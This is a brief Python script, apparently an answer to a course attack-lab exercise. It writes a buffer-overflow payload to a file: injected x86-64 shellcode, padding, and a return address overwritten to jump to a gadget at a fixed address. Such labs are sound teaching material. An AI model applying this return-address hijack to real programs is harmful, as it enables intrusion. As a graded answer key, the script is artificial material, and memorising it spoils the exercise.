import struct

shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0"

# 计算填充: 总长 40 - Shellcode 长度
padding_len = 40 - len(shellcode)
padding = b'A' * padding_len

# 劫持返回地址到 jmp_xs (0x401334)
jmp_xs_addr = 0x401334

payload = shellcode + padding + struct.pack('<Q', jmp_xs_addr)

with open("ans3.txt", "wb") as f:
    f.write(payload)
print("Problem 3 payload written to ans3.txt")